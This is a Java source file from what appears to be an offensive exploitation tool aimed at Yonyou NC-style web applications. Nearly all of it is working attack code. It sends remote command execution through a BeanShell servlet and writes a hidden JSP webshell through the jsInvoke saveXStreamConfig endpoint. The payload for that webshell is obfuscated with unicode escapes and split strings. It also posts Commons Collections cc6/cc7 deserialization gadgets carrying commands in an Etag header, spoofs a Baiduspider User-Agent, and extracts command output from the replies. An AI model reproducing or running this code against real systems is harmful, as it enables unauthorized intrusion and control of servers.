package vul;

import Util.HttpUtil;
import Util.RandomStringGenerator;
import okhttp3.RequestBody;
import okhttp3.Response;

import java.io.IOException;
import java.net.Proxy;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;


public class exec {
    private InputStream cc6 = exec.class.getResourceAsStream("/cc6-TomcatEcho-Etag.bin");

    private InputStream cc7 = exec.class.getResourceAsStream("/cc7-TomcatEcho-Etag.bin");


    //正则匹配，用于取出命令执行的回显
    public String re(String regex, String html) {
        // 正则表达式匹配<pre>标签中的内容
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(html);
        // 如果找到匹配项
        if (matcher.find()) {
            // 返回匹配到的第一个组的内容
            return matcher.group(1);
        } else {
            // 如果没有匹配项则返回null
            return null;
        }
    }

    private static byte[] getFileBytes(String path) {
        try (InputStream is = exec.class.getResourceAsStream(path);
             ByteArrayOutputStream baos = new ByteArrayOutputStream()) {

            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = is.read(buffer)) != -1) {
                baos.write(buffer, 0, bytesRead);
            }
            return baos.toByteArray();

        } catch (IOException e) {
            
            return null;
        }
    }

    public String execAction(Map deserializeMap,String vulName, String url, String cmd, Object proxy) throws IOException {
        String result;
        if ("BshServlet rce".equals(vulName)) {
            result = BshServletRce(url, cmd, proxy);
        }else if ("jsInvoke rce".equals(vulName)) {
            result = jsInvokeRce(url, cmd, proxy);
        } else if (vulName.contains("反序列化")) {
            String path = (String) deserializeMap.get(vulName);
            result = deserializeAction(url,path,vulName, cmd, proxy);
        } else if ("All".equals(vulName)) {
            result = "请选择对应的漏洞";
        }else {
            result = "该漏洞暂不支持";
        }
        return result;

    }

    public String BshServletRce(String url, String cmd, Object proxy) throws IOException {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");

        String data = String.format("bsh.script=exec(\"%s\");", cmd);
        RequestBody body = RequestBody.create(data, okhttp3.MediaType.parse("application/x-www-form-urlencoded"));

        Response response = null;
        try {
            response = HttpUtil.post(url + "servlet/~ic/bsh.servlet.BshServlet", headers, body, (HttpUtil.ProxyConfig) proxy);
            String statusCode = String.valueOf(response.code());
            if ("200".equals(statusCode)) {
                String resBody = response.body().string();
                String result;
                result = re("(?s)<pre>(.+?)</pre>", resBody);
                if (result != null) {
                    return result;
                } else {
                    return "貌似没有成功～";
                }
            } else {
                return "接口不存在";
            }
        } catch (IOException e) {
            
            return "BshServlet rce 请求失败: " + e.getMessage();
        } finally {
            if (response != null) {
                response.close();
            }
        }
    }

    public String jsInvokeRce(String url, String cmd, Object proxy) throws IOException {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
        String randomStr = RandomStringGenerator.generateRandomString(10);
        String data = String.format("{\n" +
                "                \"serviceName\": \"nc.itf.iufo.IBaseSPService\",\n" +
                "                \"methodName\": \"saveXStreamConfig\",\n" +
                "                \"parameterTypes\": [\n" +
                "                    \"java.lang.Object\",\n" +
                "                    \"java.lang.String\"\n" +
                "                ],\n" +
                "                \"parameters\": [\n" +
                "                    \"${param[param.l]()[param.a](param.b)[param.c]()[param.d](param.e)[param.f](header.%s)}\",\n" +
                "                    \"webapps/nc_web/.%s.jsp\"\n" +
                "                ]\n" +
                "            }", randomStr, randomStr);
        RequestBody body = RequestBody.create(data, okhttp3.MediaType.parse("application/json"));

        Response response = null;
        try {
            response = HttpUtil.post(url + "uapjs/jsinvoke/?action=invoke", headers, body, (HttpUtil.ProxyConfig) proxy);
            String statusCode = String.valueOf(response.code());
            if ("200".equals(statusCode)) {
                headers.put(randomStr, String.format("var s = [7];s[0] = 'c'+'m'+'d';s[1] ='/c';s[2] = '\"e'+'c'+'h'+'o'+' '+'%s&&%s&&'+'e'+'c'+'h'+'o'+' '+'%s\"';s[3] = '|'+'|';s[4] = 'b'+'a'+'s'+'h';s[5] = '-c';s[6] = '\"e'+'c'+'h'+'o'+' '+'%s&&%s&&'+'e'+'c'+'h'+'o'+' '+'%s\"';var p =java.lang.Runtime.getRuntime().\\u0065\\u0078\\u0065\\u0063(s);var sc = new java.util.Scanner(p.\\u0067\\u0065\\u0074\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d(),\"GBK\").useDelimiter('\\\\A');var result = sc.hasNext() ? sc.next() : '';sc.close();result;", randomStr,cmd, randomStr,randomStr,cmd, randomStr));
                data = "l=getClass&a=forName&b=javax.script.ScriptEngineManager&c=newInstance&d=getEngineByName&e=js&f=eval";
                RequestBody body2 = RequestBody.create(data, okhttp3.MediaType.parse("application/x-www-form-urlencoded"));
                response = HttpUtil.post(url + String.format(".%s.jsp", randomStr), headers, body2, (HttpUtil.ProxyConfig) proxy);
                statusCode = String.valueOf(response.code());
                if ("200".equals(statusCode)) {
                    String resBody = response.body().string();
                    String result;
                    result = re(String.format("(?s)%s(.+?)%s", randomStr,randomStr), resBody);
                    if (result != null) {
                        return result;
                    } else {
                        return "貌似没有成功～";
                    }
                } else {
                    return "漏洞不存在";
                }
            } else {
                return "接口不存在";
            }
        } catch (IOException e) {
            
            return "请求失败:" + e.getMessage();
        } finally {
            if (response != null) {
                response.close();
            }
        }
    }

    public String deserializeAction(String url, String path, String vulName,String cmd, Object proxy) throws IOException {
        Map<String, String> headers = new HashMap<>();
        String randomStr = RandomStringGenerator.generateRandomString(10);
        headers.put("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
        headers.put("Etag", String.format("echo %s && %s && echo %s", randomStr,cmd,randomStr));
        InputStream data;
        if (vulName.contains("cc6")) {
            data = cc6;
        } else {
            data = cc7;
        }
        RequestBody body = HttpUtil.createRequestBodyFromStream(data, okhttp3.MediaType.parse("application/octet-stream"));
        Response response = null;
        try {
            response = HttpUtil.post(url + path, headers, body, (HttpUtil.ProxyConfig) proxy);
            String statusCode = String.valueOf(response.code());
            if ("200".equals(statusCode)) {
                String resBody = response.body().string();
                String result;
                result = re(String.format("(?s)%s(.+?)%s", randomStr,randomStr), resBody);
                if (result != null) {
                    return result;
                } else {
                    return "貌似没有成功～";
                }
            } else {
                return "接口不存在";
            }
        } catch (IOException e) {
            
            return "[-]请求失败:" + e.getMessage();
        } finally {
            if (response != null) {
                response.close();
            }
        }
    }

}
